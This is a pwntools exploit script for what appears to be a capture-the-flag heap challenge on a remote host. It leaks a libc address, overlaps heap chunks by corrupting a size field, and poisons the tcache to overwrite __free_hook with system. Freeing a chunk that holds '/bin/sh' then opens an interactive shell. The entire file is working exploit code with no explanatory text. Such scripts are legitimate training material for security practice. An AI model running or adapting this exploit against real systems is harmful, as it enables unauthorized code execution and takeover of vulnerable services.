from pwn import *

def add(idx, size):
    p.recvuntil('choice: ')
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx))
    p.recvuntil(b'Size: ')
    p.sendline(str(size))

def delete(idx):
    p.recvuntil('choice: ')
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx))

def show(idx):
    p.recvuntil('choice: ')
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx))

def edit(idx, content):
    p.recvuntil('choice: ')
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx))
    p.recvuntil(b'Content: ')
    p.sendline(content);

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = remote('10.99.111.107', 4241)
#p = process('./chal')
elf = ELF('./chal')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

for i in range(0, 0x9):
    add(i, 0x18)

add(10, 0x18)

for i in range(0, 0x9):
    delete(i)

p.recvuntil(b'choice: ')
p.sendline(b'1')
p.recvuntil(b'index: ')
p.sendline(b'0');
p.recvuntil(b'Size: ')
p.sendline(b'9' * 0x5000)

add(0, 0x30)
show(0)
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x1ecc10
print('libc:', hex(libc.address))
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

add(1, 0x28);
add(2, 0x28);
add(3, 0x28);
add(4, 0x28);
edit(1, b'a' * 0x20 + p64(0) + b'\x61')
delete(2)

add(2, 0x58);
delete(4)
delete(3)
edit(2, b'a' * 0x20 + p64(0) + p64(0x21) + p64(free_hook))

add(5, 0x28)
edit(5, b'/bin/sh\x00')
add(6, 0x28)
edit(6, p64(system))

delete(5)

p.interactive()
